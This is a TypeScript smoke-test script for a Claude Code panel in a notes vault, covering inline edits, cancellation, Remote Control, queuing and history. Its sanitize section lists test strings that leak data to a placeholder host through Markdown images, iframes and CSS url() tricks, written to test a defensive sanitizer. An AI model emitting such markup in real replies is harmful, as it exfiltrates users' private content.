    .then(async (answer) => {
      const note = summaryNote(answer, { date: '2026-09-15', sessionId: 'test-session' });
      console.log(`${Date.now() - started} ms; starts with frontmatter: ${note.startsWith('---\n')}; has heading: ${/^# /m.test(note)}; sessions saved: ${(await listHistory(cwd, [], true)).length}`);
      console.log(note);
    })
    .catch((error) => {
      console.log(`summary failed: ${String(error)}`);
      process.exitCode = 1;
    });
} else if (process.argv.includes('--inline')) {
  // One inline edit against the real CLI (optionally `--model <id>`), then one cancelled after
  // half a second; neither may leave a saved session behind.
  const original = 'Teh quick brwn fox jumpd over the lazy dog.';
  const system = inlineEditSystem(false, '');
  const prompt = inlineEditPrompt({ path: 'Test.md', original, before: 'An intro paragraph.\n\n', after: '\n\nA closing paragraph.' }, 'Fix the spelling.');
  const model = argValues('--model')[0];
  void (async () => {
    let updates = 0;
    const started = Date.now();
    try {
      const answer = await runOneShot({ cwd, claudePath, extraPath: [] }, { system, prompt, model }, () => void (updates += 1), new AbortController().signal);
      console.log(`answer: ${JSON.stringify(answer)}; cleaned: ${JSON.stringify(cleanReplacement(answer, original))}; streamed updates: ${updates}; ${Date.now() - started} ms`);
    } catch (error) {
      console.log(`edit failed: ${String(error)}`);
      process.exitCode = 1;
    }
    const cancel = new AbortController();
    setTimeout(() => cancel.abort(), 500);
    const cancelStarted = Date.now();
    await runOneShot({ cwd, claudePath, extraPath: [] }, { system, prompt: `${prompt} Then write three paragraphs about foxes.`, model }, () => undefined, cancel.signal)
      .then((answer) => console.log(`cancelled run finished anyway: ${answer.length} chars`))
      .catch((error) => console.log(`cancelled run ended after ${Date.now() - cancelStarted} ms: ${String(error).slice(0, 80)}`));
    console.log(`sessions saved: ${(await listHistory(cwd, [], true)).length}`);
  })();
} else if (process.argv.includes('--paths')) {
  // No Claude process: vault-relative paths for tool lines, with macOS and Windows path rules,
  // and the executable and environment this machine would use.
  const cases: [string, string, typeof posix][] = [
    ['/Users/me/Vault/Notes/a.md', '/Users/me/Vault', posix],
    ['/Users/me/Vault2/a.md', '/Users/me/Vault', posix],
    ['/Users/me/a.md', '/Users/me/Vault', posix],
    ['Notes/a.md', '/Users/me/Vault', posix],
    ['C:\\Users\\me\\Vault\\Notes\\a.md', 'C:\\Users\\me\\Vault', win32],
    ['c:\\users\\me\\vault\\Notes\\a.md', 'C:\\Users\\me\\Vault', win32],
    ['C:\\Users\\me\\Vault2\\a.md', 'C:\\Users\\me\\Vault', win32],
    ['D:\\Vault\\a.md', 'C:\\Users\\me\\Vault', win32],
  ];
  for (const [file, root, paths] of cases) {
    console.log(`${paths === win32 ? 'win32' : 'posix'} ${file} -> ${JSON.stringify(vaultRelative(file, root, paths) ?? null)}`);
  }
  const found = findClaude('');
  console.log(`findClaude: ${JSON.stringify(found)}`);
  if (found.path) {
    const env = claudeEnv(found.path, ['/extra/bin']);
    const pathKeys = Object.keys(env).filter((key) => key.toUpperCase() === 'PATH');
    console.log(`PATH keys: ${pathKeys.join(', ')}; starts: ${env.PATH?.split(delimiter).slice(0, 3).join(delimiter)}`);
  }
} else if (process.argv.includes('--sanitize')) {
  // Prints how reply Markdown is rewritten before rendering; no Claude process involved.
  const samples = [
    'Leak ![x](https://evil.test/a.png?q=secret) end',
    '<img src="https://evil.test/p.gif"> and <iframe src=//evil.test></iframe>',
    'Local ![](attachments/fig.png) and embed ![[Figure 1.png]] stay',
    'Inline `![x](https://evil.test/code)` stays, and there are 3 items and 12 notes',
    '```html\n<img src="https://example.com/in-code.png">\n```\nafter ![y](https://evil.test/after.png)',
    '<div style="background:url(https://evil.test/bg)">styled</div>',
    'Ref ![alt][r]\n\n[r]: https://evil.test/ref.png',
    // Cases from the 2026-09-15 review.
    '<span style=background:url(https://evil.test/?q=SECRET)>x</span>',
    '<span style="background:u\\72l(https://evil.test/esc)">x</span>',
    '![a [b] c](https://evil.test/nested.png)',
    '<input type="image" src="https://evil.test/input.png">',
    '<table background="https://evil.test/table.png"><tr><td>x</td></tr></table>',
    'Embed ![[Figure 1.png]] and ![local](attachments/fig.png) stay; shortcut ![ref] loses its !',
  ];
  for (const sample of samples) console.log(`${JSON.stringify(sample)}\n  -> ${JSON.stringify(neutralizeRemoteMedia(sample))}`);
} else if (process.argv.includes('--rc-enable')) {
  // Starts a chat session in the given folder (default: a temporary one), gets one reply, then
  // switches Remote Control on through the SDK and prints the response; holds the session 30 s.
  const dir = argValues('--rc-enable')[0] && !argValues('--rc-enable')[0].startsWith('--') ? argValues('--rc-enable')[0] : cwd;
  const holdSeconds = Number(argValues('--hold')[0] ?? 30);
  let enabled = false;
  const rc: ClaudeSession = new ClaudeSession(
    { cwd: dir, claudePath, extraPath: [], permissionMode: 'default' },
    {
      onMessage(message) {
        const at = new Date().toISOString().slice(11, 19);
        if (message.type === 'system' && message.subtype === 'init') console.log(`${at} session ${message.session_id} in ${dir}`);
        // After Remote Control is on, anything below comes from a turn started elsewhere (the phone).
        if (enabled && message.type === 'assistant') {
          for (const block of message.message.content) {
            if (block.type === 'text') console.log(`${at} remote-turn assistant text: ${JSON.stringify(block.text.slice(0, 120))}`);
          }
        }
        if (enabled && message.type === 'user' && typeof message.message.content === 'string') {
          console.log(`${at} remote-turn user text: ${JSON.stringify(message.message.content.slice(0, 120))}`);
        }
        if (message.type === 'result') {
          console.log(`${at} result: ${message.subtype === 'success' ? message.result.slice(0, 120) : message.errors.join('; ')}`);
          if (enabled) return;
          enabled = true;
          void rc
            .enableRemoteControl(true, 'Obsidian panel test')
            .then((response) => console.log(`${at} enableRemoteControl response: ${JSON.stringify(response)}`))
            .catch((error: unknown) => console.log(`${at} enableRemoteControl failed: ${String(error)}`))
            .finally(() =>
              setTimeout(() => {
                console.log(`${new Date().toISOString().slice(11, 19)} closing`);
                rc.close();
              }, holdSeconds * 1000),
            );
        }
      },
      async onPermission() {
        return { behavior: 'deny', message: 'Denied by the smoke test.' };
      },
      onEnd(error, stderrTail) {
        if (error) console.log(`error: ${error.message}\n${stderrTail ?? ''}`);
      },
    },
  );
  rc.send('Reply with exactly: ok');
} else if (process.argv.includes('--phone-missing')) {
  // A wrong executable path must leave phone access stopped (in error), not stuck "running".
  const server = new RemoteControlServer();
  server.start({ cwd, claudePath: '/nonexistent/claude', extraPath: [], name: 'missing', permissionMode: 'default' });
  setTimeout(() => console.log(`after failed start: running=${server.isRunning()} status=${JSON.stringify(server.status)}`), 500);
} else if (process.argv.includes('--phone')) {
  // Runs the Remote Control server in the given folder (it must be one Claude Code trusts)
  // for 25 s, printing each status change, then stops it.
  const dir = argValues('--phone')[0];
  const server = new RemoteControlServer();
  server.onChange(() => console.log(`phone access: ${JSON.stringify(server.status)}`));
  server.start({ cwd: dir, claudePath, extraPath: [], name: 'vault-claude phone test', permissionMode: 'default' });
  setTimeout(() => server.stop(), 25_000);
} else if (process.argv.includes('--queue')) {
  // Sends a second message while the first reply is streaming and logs how it is handled.
  // `--queue tool` makes the first request use a tool, so the CLI has a step boundary to fold at.
  const withTool = argValues('--queue')[0] === 'tool';
  const priorityArg = argValues('--priority')[0] as 'now' | 'next' | 'later' | undefined;
  let sentSecond = false;
  let results = 0;
  const first = randomUUID();
  const second = randomUUID();
  const tag = (uuids: string[] | undefined) =>
    (uuids ?? []).map((id) => (id === first ? 'FIRST' : id === second ? 'SECOND' : id.slice(0, 8))).join('+') || '-';
  const queued: ClaudeSession = new ClaudeSession(
    { cwd, claudePath, extraPath: [], permissionMode: 'default' },
    {
      onMessage(message) {
        if (message.type === 'stream_event' && !sentSecond && message.event.type === 'content_block_delta') {
          sentSecond = true;
          queued.send('Second question: what is 2+2? Answer with just the number.', priorityArg, second);
          console.log(`sent second message mid-reply (priority ${priorityArg ?? 'unset'})`);
          if (process.argv.includes('--interrupt')) {
            // Stop pressed with a message queued: does the queued message still get a turn?
            setTimeout(() => {
              console.log('interrupting');
              void queued.interrupt();
            }, 300);
            setTimeout(() => {
              console.log(`gave up waiting after ${results} result(s)`);
              queued.close();
            }, 45_000);
          }
        }
        if (message.type === 'assistant' && message.parent_tool_use_id === null) {
          for (const block of message.message.content) {
            if (block.type === 'text') console.log(`assistant text [${tag(message.user_message_uuids)}]: ${JSON.stringify(block.text.slice(0, 60))}`);
            if (block.type === 'tool_use') console.log(`assistant tool [${tag(message.user_message_uuids)}]: ${block.name}`);
          }
        }
        if (message.type === 'result') {
          results += 1;
          const uuids = (message as { user_message_uuids?: string[] }).user_message_uuids;
          const text = message.subtype === 'success' ? message.result.slice(0, 60) : message.subtype;
          console.log(`result ${results} [${tag(uuids)}]: ${JSON.stringify(text)}`);
          if (uuids?.includes(second) || results >= 3) queued.close();
        }
      },
      async onPermission() {
        return { behavior: 'deny', message: 'Denied by the smoke test.' };
      },
      onEnd(error) {
        if (error) console.log(`error: ${error.message}`);
      },
    },
  );
  queued.send(
    withTool
      ? 'Use the Bash tool to run `ls -la`, then write the numbers 1 to 30, one per line.'
      : 'Write the numbers from 1 to 40, one per line, nothing else.',
    undefined,
    first,
  );
} else if (historyIndex !== -1) {
  // Read-only: list panel chats for the given directory, then exit without chatting.
  const dir = process.argv[historyIndex + 1];
  void listHistory(dir, [], false).then((items) => {
    for (const item of items) console.log(`${new Date(item.updatedAt).toISOString()} ${item.id} ${item.title.slice(0, 60)}`);
    console.log(`panel chats found: ${items.length}`);
  });
} else {
  void (async () => {
    const started = Date.now();
    console.log(`configured defaults: ${JSON.stringify(await configuredDefaults(cwd))}`);
    const { models, commands, plan } = await probeClaude({ cwd, claudePath, extraPath: [] });
    console.log(
      `probe: ${models.map((m) => m.value).join(', ')}; commands: ${commands.length} (${commands.slice(0, 6).map((c) => c.name).join(', ')}); plan 5h=${plan?.rate_limits?.five_hour?.utilization ?? 'n/a'}% in ${Date.now() - started} ms`,
    );
    console.log(`sessions saved by the probe: ${(await listHistory(cwd, [], true)).length}`);
    session.send(prompts[0]);
  })();
}
